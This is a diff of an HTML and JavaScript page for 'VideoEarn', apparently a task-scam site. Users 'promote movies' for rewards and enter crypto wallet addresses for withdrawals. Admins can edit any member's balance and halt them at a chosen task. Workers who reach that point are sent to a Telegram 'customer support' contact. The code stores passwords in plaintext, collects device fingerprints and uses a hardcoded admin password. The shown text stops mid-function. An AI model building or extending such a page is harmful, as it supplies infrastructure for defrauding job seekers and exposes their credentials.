@@ -2,122 +2,729 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VideoEarn</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VideoEarn Platform</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-    body { background-color: #f4f7fb; margin: 0; padding: 20px; color: #333; }
+    :root {
+      --bg: #f1f5f9;
+      --card-bg: #ffffff;
+      --border: #e2e8f0;
+      --primary: #2563eb;
+      --primary-hover: #1d4ed8;
+      --accent: linear-gradient(135deg, #2563eb 0%, #3b82f6 50%, #60a5fa 100%);
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --success: #16a34a;
+      --warning: #d97706;
+      --telegram: #0088cc;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+    body { background-color: var(--bg); color: var(--text); padding: 16px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+    .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 16px; }
+
+    header { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
+    .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); }
+    .nav-btn { background: #ffffff; border: 1px solid var(--border); color: var(--text); padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; }
+    .nav-btn:hover { background: #f8fafc; }
+
+    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03); }
+    h2, h3, h4 { margin-bottom: 12px; color: var(--text); }
+    p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 12px; }
+
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 600; color: #fff; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; }
+    .btn:hover { background: var(--primary-hover); }
+    .btn-secondary { background: #f1f5f9; color: var(--text); border: 1px solid var(--border); }
+    .btn-secondary:hover { background: #e2e8f0; }
+    .btn-telegram { background: var(--telegram); color: #fff; }
     
-    .header { display: flex; justify-content: space-between; align-items: center; max-width: 450px; margin: 0 auto 20px auto; }
-    .logo { color: #1a56db; font-size: 24px; font-weight: bold; margin: 0; }
-    .admin-btn { border: 1px solid #d1d5db; background: #fff; padding: 8px 16px; border-radius: 8px; font-weight: 500; cursor: pointer; }
+    label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 4px; }
+    input, select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: #f8fafc; color: var(--text); margin-bottom: 12px; font-size: 0.9rem; }
+    input:focus, select:focus { outline: 2px solid var(--primary); background: #fff; }
 
-    .card { background: #fff; max-width: 450px; margin: 0 auto; border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-    h2 { margin-top: 0; font-size: 22px; font-weight: 700; }
-    p.subtitle { color: #6b7280; margin-top: -8px; margin-bottom: 20px; font-size: 14px; }
+    .progress-bar { background: #e2e8f0; height: 100px; border-radius: 5px; overflow: hidden; margin: 12px 0; }
+    .progress-fill { background: var(--primary); height: 100%; width: 0%; transition: width 0.3s ease; }
+    .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 12px; background: #f8fafc; }
+    .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #e2e8f0; }
+    
+    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+    .stat-card { background: #f8fafc; padding: 10px; border-radius: 8px; text-align: center; border: 1px solid var(--border); }
+    .stat-card span { font-size: 0.8rem; color: var(--text-muted); font-weight: 500; }
+    .stat-card div { font-size: 1.1rem; font-weight: 700; color: var(--primary); }
 
-    .form-group { margin-bottom: 16px; }
-    label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #374151; }
-    input { width: 100%; padding: 12px; border: 1px solid #e5e7eb; border-radius: 8px; font-size: 14px; outline: none; }
-    input:focus { border-color: #1a56db; }
-
-    .btn-primary { width: 100%; background: #2563eb; color: #fff; border: none; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer; margin-top: 8px; }
-    .toggle-text { text-align: center; margin-top: 16px; font-size: 14px; color: #6b7280; }
-    .toggle-link { color: #2563eb; text-decoration: none; font-weight: 600; cursor: pointer; }
-
-    /* Hide sections by default */
+    .admin-section { border-top: 1px dashed var(--border); padding-top: 16px; margin-top: 16px; }
     .hidden { display: none !important; }
+    .badge { padding: 4px 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 600; }
+    .badge-pending { background: #fef3c7; color: var(--warning); }
+    .badge-approved { background: #dcfce7; color: var(--success); }
+    .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 600; }
+    
+    .user-list-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 200px; overflow-y: auto; margin-bottom: 12px; }
+    .user-item { display: flex; flex-direction: column; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 2px; }
+    .user-item-header { display: flex; justify-content: space-between; font-weight: 700; }
+    .user-item-details { font-size: 0.75rem; color: var(--text-muted); }
+
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 23, 42, 0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
+    .modal-box { background: #ffffff; border-radius: 16px; padding: 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.2); animation: popIn 0.2s ease-out; }
+    @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
   </style>
 </head>
 <body>
 
-  <!-- Header -->
-  <div class="header">
-    <h1 class="logo">VideoEarn</h1>
-    <button class="admin-btn" id="adminToggleBtn" onclick="showView('admin')">Admin Login</button>
+  <div class="container">
+    <header>
+      <div class="logo">VideoEarn</div>
+      <button class="nav-btn" id="toggle-view-btn" onclick="toggleView()">Admin Login</button>
+    </header>
+
+    <!-- AUTHENTICATION VIEW -->
+    <div id="auth-view" class="card">
+      <div id="login-box">
+        <h3>Welcome Back</h3>
+        <p>Log in to your VideoEarn account</p>
+        <label>Email or Username</label>
+        <input type="text" id="login-identifier" placeholder="Enter Email or Username">
+        <label>Password</label>
+        <input type="password" id="login-password" placeholder="Password">
+        <button class="btn" onclick="userLogin()">Log In</button>
+        <p style="margin-top: 12px; text-align: center;">
+          Don't have an account? <span class="tab-link" onclick="showAuthTab('signup')">Sign Up</span>
+        </p>
+      </div>
+
+      <div id="signup-box" class="hidden">
+        <h3>Create Account</h3>
+        <p>Register as a new member to start earning</p>
+        <label>Email Address</label>
+        <input type="email" id="signup-email" placeholder="name@example.com">
+        <label>Username</label>
+        <input type="text" id="signup-username" placeholder="Choose Username">
+        <label>Password</label>
+        <input type="password" id="signup-password" placeholder="Create Password">
+        <button class="btn" onclick="userSignup()">Create Account</button>
+        <p style="margin-top: 12px; text-align: center;">
+          Already have an account? <span class="tab-link" onclick="showAuthTab('login')">Log In</span>
+        </p>
+      </div>
+    </div>
+
+    <!-- WORKER VIEW -->
+    <div id="worker-view" class="hidden">
+      <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+          <h3>Worker Dashboard</h3>
+          <button class="nav-btn" onclick="userLogout()">Logout (<span id="user-display-name">User</span>)</button>
+        </div>
+
+        <div class="stats-grid">
+          <div class="stat-card">
+            <span>Current Set</span>
+            <div id="current-set-display">Set 1 / 3</div>
+          </div>
+          <div class="stat-card">
+            <span>Total Earnings</span>
+            <div id="worker-balance" style="color: var(--success);">$0.00</div>
+          </div>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 500;">
+          <span>Progress (Set <span id="set-num-text">1</span>)</span>
+          <span id="progress-text">0 / 29 Completed</span>
+        </div>
+        <div class="progress-bar" style="height:10px;">
+          <div class="progress-fill" id="progress-fill"></div>
+        </div>
+
+        <!-- SET COMPLETED / CONTACT CUSTOMER SUPPORT NOTIFICATION -->
+        <div id="completed-set-message" class="hidden" style="text-align: center; padding: 20px 10px; background: #fffbeeb0; border: 1px solid #fef3c7; border-radius: 12px; margin-top: 12px;">
+          <h4 style="color: var(--warning); margin-bottom: 8px;">🎉 Set Completed!</h4>
+          <p id="pause-reason-text" style="color: #92400e; font-weight: 500; font-size: 0.95rem; margin-bottom: 16px;">
+            You have successfully completed this set! Kindly contact customer support to proceed to the next set.
+          </p>
+          <a id="support-set-link" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Contact Customer Support</a>
+        </div>
+
+        <div id="movie-container" class="movie-box" style="margin-top:12px;">
+          <img id="movie-img" src="" alt="Promo Movie">
+          <h4 id="movie-title">Movie Promotion #1</h4>
+          <p id="admin-comment" style="font-style: italic; color: var(--primary);">Admin Comment: Ready to promote!</p>
+          <div style="font-weight: 700; color: var(--success); margin-bottom: 8px;">Reward: <span id="movie-reward">$0.50</span></div>
+          <button class="btn" onclick="promoteMovie()">Promote This Movie</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Withdraw Earnings</h3>
+        <p>Request withdrawal once available balance is ready.</p>
+        <label>Crypto Wallet Address</label>
+        <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
+        <label>Withdrawal Amount ($)</label>
+        <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
+        <button class="btn btn-secondary" onclick="requestWithdrawal()">Apply for Withdrawal</button>
+        <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
+      </div>
+
+      <!-- CUSTOMER SUPPORT CARD -->
+      <div class="card" style="text-align: center;">
+        <h3>Need Help?</h3>
+        <p>Contact our Official Support Team on Telegram for instant assistance.</p>
+        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Chat with Support on Telegram</a>
+      </div>
+    </div>
+
+    <!-- ADMIN VIEW -->
+    <div id="admin-view" class="hidden">
+      <div class="card" id="admin-login-card">
+        <h3>Admin Access Required</h3>
+        <label>Password</label>
+        <input type="password" id="admin-pass-input" placeholder="Enter Admin Password">
+        <button class="btn" onclick="loginAdmin()">Login to Admin Panel</button>
+      </div>
+
+      <div id="admin-dashboard" class="hidden">
+        <div class="card">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h3>Admin Panel</h3>
+            <button class="nav-btn" onclick="logoutAdmin()">Logout</button>
+          </div>
+
+          <!-- All Registered Members -->
+          <div class="admin-section">
+            <h4>All Registered Members</h4>
+            <div id="all-users-list" class="user-list-box">Loading users...</div>
+          </div>
+
+          <!-- Manage Selected Member -->
+          <div class="admin-section">
+            <h4>Manage Selected Member</h4>
+            <label>Select Member to Manage:</label>
+            <select id="admin-selected-user" onchange="loadAdminUserData()"></select>
+
+            <label>Select Set Number (Set 1, 2, or 3):</label>
+            <select id="admin-user-set-select">
+              <option value="1">Set 1</option>
+              <option value="2">Set 2</option>
+              <option value="3">Set 3</option>
+            </select>
+
+            <label>Stop Member At Work # (1 to 29):</label>
+            <input type="number" id="admin-stop-work-num" min="1" max="29" value="29">
+
+            <label>Edit Member Balance ($):</label>
+            <input type="number" id="admin-user-balance" step="0.01">
+
+            <button class="btn btn-secondary" onclick="saveAdminUserSettings()">Update Member Settings</button>
+            <button class="btn" style="margin-top: 8px;" onclick="approveNextSet()">Approve Set & Move to Next</button>
+          </div>
+
+          <!-- Manage Telegram Support Link -->
+          <div class="admin-section">
+            <h4>Telegram Support Settings</h4>
+            <label>Telegram Support Link or Username:</label>
+            <input type="text" id="admin-telegram-link" placeholder="e.g. https://t.me/your_admin_username">
+            <button class="btn btn-secondary" onclick="saveTelegramLink()">Save Telegram Support Link</button>
+          </div>
+
+          <!-- Upload Picture & Edit Settings -->
+          <div class="admin-section">
+            <h4>Upload & Edit Movie Pictures</h4>
+            <label>Select Set Number (1, 2, or 3):</label>
+            <select id="edit-set-num">
+              <option value="1">Set 1</option>
+              <option value="2">Set 2</option>
+              <option value="3">Set 3</option>
+            </select>
+
+            <label>Picture Number (1 to 29):</label>
+            <input type="number" id="edit-img-index" min="1" max="29" value="1">
+
+            <label>Upload Movie Picture:</label>
+            <input type="file" id="edit-img-file" accept="image/*">
+
+            <label>Reward Amount ($):</label>
+            <input type="number" id="edit-img-reward" value="0.50" step="0.01">
+
+            <label>Admin Comment:</label>
+            <input type="text" id="edit-img-comment" placeholder="Featured movie promo note...">
+
+            <button class="btn btn-secondary" onclick="savePictureAndSettings()">Save Picture & Details</button>
+          </div>
+
+          <!-- Withdrawal Requests -->
+          <div class="admin-section">
+            <h4>Withdrawal Requests</h4>
+            <p id="admin-withdraw-request-text">No active withdrawal request.</p>
+            <button class="btn" id="approve-withdraw-btn" style="background: var(--success); display: none;" onclick="approveWithdrawal()">Approve Withdrawal Request</button>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <!-- Login Card -->
-  <div id="loginView" class="card">
-    <h2>Welcome Back</h2>
-    <p class="subtitle">Log in to your VideoEarn account</p>
-    <div class="form-group">
-      <label>Email or Username</label>
-      <input type="text" id="loginUser" placeholder="Enter Email or Username">
-    </div>
-    <div class="form-group">
-      <label>Password</label>
-      <input type="password" id="loginPass" placeholder="Password">
-    </div>
-    <button class="btn-primary" onclick="handleLogin()">Log In</button>
-    <div class="toggle-text">
-      Don't have an account? <span class="toggle-link" onclick="showView('signup')">Sign Up</span>
+  <!-- PROMOTION COMPLETED MODAL POPUP -->
+  <div id="promo-modal" class="modal-overlay hidden">
+    <div class="modal-box">
+      <div style="font-size: 2.5rem; margin-bottom: 8px;">🎉</div>
+      <h3>Thank You!</h3>
+      <p id="modal-reward-text">You earned $0.50 for completing this promotion task.</p>
+      <button class="btn" onclick="closeModal()">Continue</button>
     </div>
   </div>
 
-  <!-- Sign Up Card -->
-  <div id="signupView" class="card hidden">
-    <h2>Create Account</h2>
-    <p class="subtitle">Join VideoEarn to start earning</p>
-    <div class="form-group">
-      <label>Username</label>
-      <input type="text" id="signupUser" placeholder="Choose Username">
-    </div>
-    <div class="form-group">
-      <label>Email</label>
-      <input type="email" id="signupEmail" placeholder="Enter Email">
-    </div>
-    <div class="form-group">
-      <label>Password</label>
-      <input type="password" id="signupPass" placeholder="Password">
-    </div>
-    <button class="btn-primary" onclick="handleSignUp()">Sign Up</button>
-    <div class="toggle-text">
-      Already have an account? <span class="toggle-link" onclick="showView('login')">Log In</span>
-    </div>
-  </div>
+  <!-- FIREBASE INTEGRATION -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-analytics.js";
+    import { getFirestore, doc, setDoc, collection, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";
 
-  <!-- Admin View -->
-  <div id="adminView" class="card hidden">
-    <h2>Admin Dashboard</h2>
-    <p class="subtitle">Enter administrator credentials</p>
-    <div class="form-group">
-      <label>Admin Key / Password</label>
-      <input type="password" id="adminPass" placeholder="Enter Admin Password">
-    </div>
-    <button class="btn-primary" onclick="handleAdminLogin()">Access Panel</button>
-    <div class="toggle-text">
-      <span class="toggle-link" onclick="showView('login')">← Back to User Login</span>
-    </div>
-  </div>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAGKL96cuFJpEDe8PQhwtm_Zg0LA2fOBgo",
+      authDomain: "videoearn-342ba.firebaseapp.com",
+      projectId: "videoearn-342ba",
+      storageBucket: "videoearn-342ba.firebasestorage.app",
+      messagingSenderId: "702949776076",
+      appId: "1:702949776076:web:2dfef02d203ad8ae1e0069",
+      measurementId: "G-WS6F04VFSM"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getFirestore(app);
+
+    function detectBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Firefox")) return "Mozilla Firefox";
+      if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+      if (ua.includes("Trident")) return "Internet Explorer";
+      if (ua.includes("Edge") || ua.includes("Edg")) return "Microsoft Edge";
+      if (ua.includes("Chrome")) return "Google Chrome";
+      if (ua.includes("Safari")) return "Apple Safari";
+      return "Unknown Browser";
+    }
+
+    function detectDevice() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) return "Android Phone/Tablet";
+      if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iPhone/iPad (iOS)";
+      if (/Macintosh/.test(ua)) return "Mac Computer";
+      if (/Windows/.test(ua)) return "Windows PC";
+      if (/Linux/.test(ua)) return "Linux System";
+      return "Mobile/Desktop Device";
+    }
+
+    window.saveUserToFirebase = async function(userData) {
+      try {
+        const browserName = userData.browser || detectBrowser();
+        const deviceType = userData.device || detectDevice();
+        
+        await setDoc(doc(db, "users", userData.username), {
+          username: userData.username,
+          email: userData.email,
+          password: userData.password,
+          registeredAt: userData.registeredAt || serverTimestamp(),
+          browser: browserName,
+          device: deviceType,
+          userAgent: navigator.userAgent,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          language: navigator.language || "Unknown",
+          currentSet: userData.currentSet || 1,
+          completedInSet: userData.completedInSet || 0,
+          stopLimit: userData.stopLimit || 29,
+          isSetApproved: userData.isSetApproved !== undefined ? userData.isSetApproved : true,
+          balance: userData.balance || 0,
+          withdrawalStatus: userData.withdrawalStatus || 'None',
+          withdrawalAmount: userData.withdrawalAmount || 0,
+          walletAddress: userData.walletAddress || ''
+        }, { merge: true });
+      } catch (err) {
+        console.error("Firebase Firestore error:", err);
+      }
+    };
+
+    window.savePicturesToFirebase = async function(pictureKey, picData) {
+      try {
+        await setDoc(doc(db, "pictures", pictureKey), picData, { merge: true });
+      } catch (err) {
+        console.error("Firebase pictures save error:", err);
+      }
+    };
+
+    window.saveTelegramToFirebase = async function(link) {
+      try {
+        await setDoc(doc(db, "app_settings", "telegram"), { link: link }, { merge: true });
+      } catch (err) {
+        console.error("Firebase Telegram save error:", err);
+      }
+    };
+
+    window.listenToFirebaseData = function() {
+      onSnapshot(collection(db, "users"), (snapshot) => {
+        snapshot.forEach((doc) => {
+          window.users[doc.id] = doc.data();
+        });
+        window.saveUsers();
+        if (window.isAdminLoggedIn) {
+          window.populateAdminUsers();
+        }
+        window.renderUI();
+      });
+
+      onSnapshot(collection(db, "pictures"), (snapshot) => {
+        snapshot.forEach((doc) => {
+          window.globalPictureData[doc.id] = doc.data();
+        });
+        window.savePictures();
+        window.renderUI();
+      });
+
+      onSnapshot(doc(db, "app_settings", "telegram"), (docSnap) => {
+        if (docSnap.exists() && docSnap.data().link) {
+          window.telegramLink = docSnap.data().link;
+          localStorage.setItem('ve_telegram_link', window.telegramLink);
+          window.renderUI();
+        }
+      });
+    };
+
+    window.listenToFirebaseData();
+  </script>
 
   <script>
-    // Universal view switcher function
-    function showView(viewName) {
-      document.getElementById('loginView').classList.add('hidden');
-      document.getElementById('signupView').classList.add('hidden');
-      document.getElementById('adminView').classList.add('hidden');
+    window.users = JSON.parse(localStorage.getItem('ve_users')) || {};
+    window.globalPictureData = JSON.parse(localStorage.getItem('ve_pictures')) || {};
+    window.telegramLink = localStorage.getItem('ve_telegram_link') || 'https://t.me/';
+    let currentUser = localStorage.getItem('ve_current_user') || null;
+    window.isAdminLoggedIn = false;
 
-      if (viewName === 'login') {
-        document.getElementById('loginView').classList.remove('hidden');
-      } else if (viewName === 'signup') {
-        document.getElementById('signupView').classList.remove('hidden');
-      } else if (viewName === 'admin') {
-        document.getElementById('adminView').classList.remove('hidden');
+    window.saveUsers = function() {
+      localStorage.setItem('ve_users', JSON.stringify(window.users));
+    };
+
+    window.savePictures = function() {
+      localStorage.setItem('ve_pictures', JSON.stringify(window.globalPictureData));
+    };
+
+    function showAuthTab(tab) {
+      if (tab === 'signup') {
+        document.getElementById('login-box').classList.add('hidden');
+        document.getElementById('signup-box').classList.remove('hidden');
+      } else {
+        document.getElementById('signup-box').classList.add('hidden');
+        document.getElementById('login-box').classList.remove('hidden');
       }
     }
 
-    function handleLogin() {
-      alert("Logging in...");
+    async function userSignup() {
+      const email = document.getElementById('signup-email').value.trim().toLowerCase();
+      const u = document.getElementById('signup-username').value.trim();
+      const p = document.getElementById('signup-password').value.trim();
+
+      if (!email || !u || !p) {
+        alert('Please fill in all fields including email.');
+        return;
+      }
+
+      if (window.users[u]) {
+        alert('Username already exists. Please choose another.');
+        return;
+      }
+
+      const emailExists = Object.values(window.users).some(user => user.email === email);
+      if (emailExists) {
+        alert('An account with this email already exists. Please log in.');
+        return;
+      }
+
+      const newUser = {
+        username: u,
+        email: email,
+        password: p,
+        currentSet: 1,
+        completedInSet: 0,
+        stopLimit: 29,
+        isSetApproved: true,
+        balance: 0.00,
+        withdrawalStatus: 'None',
+        withdrawalAmount: 0,
+        walletAddress: ''
+      };
+
+      window.users[u] = newUser;
+      window.saveUsers();
+
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(newUser);
+      }
+
+      alert('Account created successfully! Please log in.');
+      showAuthTab('login');
     }
 
-    function handleSignUp() {
-      alert("Account created successfully!");
+    function userLogin() {
+      const identifier = document.getElementById('login-identifier').value.trim().toLowerCase();
+      const p = document.getElementById('login-password').value.trim();
+
+      if (!identifier || !p) {
+        alert('Please enter your email/username and password.');
+        return;
+      }
+
+      let matchedUsername = null;
+      if (window.users[identifier]) {
+        matchedUsername = identifier;
+      } else {
+        matchedUsername = Object.keys(window.users).find(u => window.users[u] && window.users[u].email === identifier);
+      }
+
+      if (matchedUsername && window.users[matchedUsername].password === p) {
+        currentUser = matchedUsername;
+        localStorage.setItem('ve_current_user', matchedUsername);
+        renderUI();
+      } else {
+        alert('Invalid Email/Username or Password!');
+      }
     }
 
-    function handleAdminLogin() {
-      alert("Admin access granted!");
+    function userLogout() {
+      currentUser = null;
+      localStorage.removeItem('ve_current_user');
+      renderUI();
     }
-  </script>
-</body>
-</html>
+
+    function toggleView() {
+      const authView = document.getElementById('auth-view');
+      const workerView = document.getElementById('worker-view');
+      const adminView = document.getElementById('admin-view');
+      const toggleBtn = document.getElementById('toggle-view-btn');
+
+      if (adminView.classList.contains('hidden')) {
+        authView.classList.add('hidden');
+        workerView.classList.add('hidden');
+        adminView.classList.remove('hidden');
+        toggleBtn.innerText = 'User Area';
+      } else {
+        adminView.classList.add('hidden');
+        toggleBtn.innerText = 'Admin Login';
+        renderUI();
+      }
+    }
+
+    function loginAdmin() {
+      const pass = document.getElementById('admin-pass-input').value;
+      if (pass === 'admin1234') {
+        window.isAdminLoggedIn = true;
+        document.getElementById('admin-login-card').classList.add('hidden');
+        document.getElementById('admin-dashboard').classList.remove('hidden');
+        document.getElementById('admin-telegram-link').value = window.telegramLink;
+        window.populateAdminUsers();
+        renderUI();
+      } else {
+        alert('Incorrect Admin Password!');
+      }
+    }
+
+    function logoutAdmin() {
+      window.isAdminLoggedIn = false;
+      document.getElementById('admin-pass-input').value = '';
+      document.getElementById('admin-login-card').classList.remove('hidden');
+      document.getElementById('admin-dashboard').classList.add('hidden');
+    }
+
+    async function saveTelegramLink() {
+      const link = document.getElementById('admin-telegram-link').value.trim();
+      if (!link) {
+        alert('Please enter a valid Telegram link.');
+        return;
+      }
+      window.telegramLink = link.startsWith('http') ? link : `https://${link}`;
+      localStorage.setItem('ve_telegram_link', window.telegramLink);
+      if (window.saveTelegramToFirebase) {
+        await window.saveTelegramToFirebase(window.telegramLink);
+      }
+      renderUI();
+      alert('Telegram Support Link updated successfully!');
+    }
+
+    window.populateAdminUsers = function() {
+      const select = document.getElementById('admin-selected-user');
+      const userListContainer = document.getElementById('all-users-list');
+      if (!select || !userListContainer) return;
+
+      select.innerHTML = '';
+      userListContainer.innerHTML = '';
+
+      const usernames = Object.keys(window.users);
+      if (usernames.length === 0) {
+        userListContainer.innerHTML = '<p style="font-size:0.8rem;">No registered members found yet.</p>';
+        return;
+      }
+
+      usernames.forEach(u => {
+        const option = document.createElement('option');
+        option.value = u;
+        option.innerText = `${u} (${window.users[u].email || 'No email'})`;
+        select.appendChild(option);
+
+        const item = document.createElement('div');
+        item.className = 'user-item';
+        const bal = typeof window.users[u].balance === 'number' ? window.users[u].balance.toFixed(2) : '0.00';
+        item.innerHTML = `
+          <div class="user-item-header">
+            <span>${u} <small>($${bal})</small></span>
+            <span style="color:var(--primary);">${window.users[u].browser || 'Browser'} / ${window.users[u].device || 'Device'}</span>
+          </div>
+          <div class="user-item-details">${window.users[u].email || 'No email'}</div>
+        `;
+        userListContainer.appendChild(item);
+      });
+
+      loadAdminUserData();
+    };
+
+    function loadAdminUserData() {
+      const select = document.getElementById('admin-selected-user');
+      if (!select) return;
+      const selectedUser = select.value;
+      if (!selectedUser || !window.users[selectedUser]) return;
+
+      const user = window.users[selectedUser];
+      document.getElementById('admin-user-balance').value = user.balance || 0;
+      document.getElementById('admin-stop-work-num').value = user.stopLimit || 29;
+      document.getElementById('admin-user-set-select').value = user.currentSet || 1;
+
+      const wReqText = document.getElementById('admin-withdraw-request-text');
+      const wApproveBtn = document.getElementById('approve-withdraw-btn');
+
+      if (user.withdrawalStatus === 'Pending') {
+        const wAmt = user.withdrawalAmount || user.balance || 0;
+        wReqText.innerHTML = `<strong>${selectedUser}</strong> requested <strong>$${wAmt.toFixed(2)}</strong><br><small>Wallet: ${user.walletAddress || 'N/A'}</small>`;
+        wApproveBtn.style.display = 'block';
+      } else {
+        wReqText.innerText = 'No pending withdrawal requests for this member.';
+        wApproveBtn.style.display = 'none';
+      }
+    }
+
+    async function saveAdminUserSettings() {
+      const selectedUser = document.getElementById('admin-selected-user').value;
+      if (!selectedUser || !window.users[selectedUser]) return;
+
+      const newBal = parseFloat(document.getElementById('admin-user-balance').value) || 0;
+      const stopNum = parseInt(document.getElementById('admin-stop-work-num').value) || 29;
+      const setNum = parseInt(document.getElementById('admin-user-set-select').value) || 1;
+
+      window.users[selectedUser].balance = newBal;
+      window.users[selectedUser].stopLimit = stopNum;
+      
+      if (window.users[selectedUser].currentSet !== setNum) {
+        window.users[selectedUser].currentSet = setNum;
+        window.users[selectedUser].completedInSet = 0;
+      }
+
+      if (window.users[selectedUser].completedInSet < stopNum) {
+        window.users[selectedUser].isSetApproved = true;
+      }
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(window.users[selectedUser]);
+      }
+      window.populateAdminUsers();
+      renderUI();
+      alert(`Updated settings for ${selectedUser}!`);
+    }
+
+    async function promoteMovie() {
+      if (!currentUser || !window.users[currentUser]) return;
+
+      const user = window.users[currentUser];
+      const maxWork = user.stopLimit || 29;
+
+      if (user.completedInSet >= maxWork || user.isSetApproved === false) return;
+
+      const key = `${user.currentSet}-${user.completedInSet + 1}`;
+      const reward = parseFloat(window.globalPictureData[key]?.reward || 0.50);
+
+      user.completedInSet += 1;
+      user.balance = (user.balance || 0) + reward;
+
+      if (user.completedInSet >= maxWork) {
+        user.isSetApproved = false;
+      }
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(user);
+      }
+
+      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for completing promotion #${user.completedInSet}!`;
+      document.getElementById('promo-modal').classList.remove('hidden');
+    }
+
+    function closeModal() {
+      document.getElementById('promo-modal').classList.add('hidden');
+      renderUI();
+    }
+
+    async function approveNextSet() {
+      const selectedUser = document.getElementById('admin-selected-user').value;
+      if (!selectedUser || !window.users[selectedUser]) {
+        alert('Please select a member first.');
+        return;
+      }
+
+      const user = window.users[selectedUser];
+      if (user.currentSet < 3) {
+        user.currentSet += 1;
+        user.completedInSet = 0;
+        user.stopLimit = 29;
+        user.isSetApproved = true;
+        window.saveUsers();
+        if (window.saveUserToFirebase) {
+          await window.saveUserToFirebase(user);
+        }
+        window.populateAdminUsers();
+        renderUI();
+        alert(`Approved Set for ${selectedUser}! Moved to Set ${user.currentSet}.`);
+      } else {
+        alert(`${selectedUser} has already completed all 3 sets!`);
+      }
+    }
+
+    function savePictureAndSettings() {
+      const setNum = document.getElementById('edit-set-num').value;
+      const imgIndex = document.getElementById('edit-img-index').value;
+      const reward = document.getElementById('edit-img-reward').value;
+      const comment = document.getElementById('edit-img-comment').value;
+      const fileInput = document.getElementById('edit-img-file');
+
+      const key = `${setNum}-${imgIndex}`;
+
+      if (!window.globalPictureData[key]) window.globalPictureData[key] = {};
+      window.globalPictureData[key].reward = reward;
+      window.globalPictureData[key].comment = comment;
+
+      const applyAndSave = async () => {
+        try {
+          window.savePictures();
+          if (window.savePicturesToFirebase) {
+            await window.savePicturesToFirebase(key, window.globalPictureData[key]);
+          }
+          renderUI();
+          alert(`Saved picture & details for Set ${setNum}, Image #${imgIndex}!`);
+        } catch (err) {
+          console.error("Save error:", err);
+          alert("Error saving picture to Firebase: " + err.message);
+        }
+      };
+
+      if (fileInput.files && fileInput.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          const img = new Image();
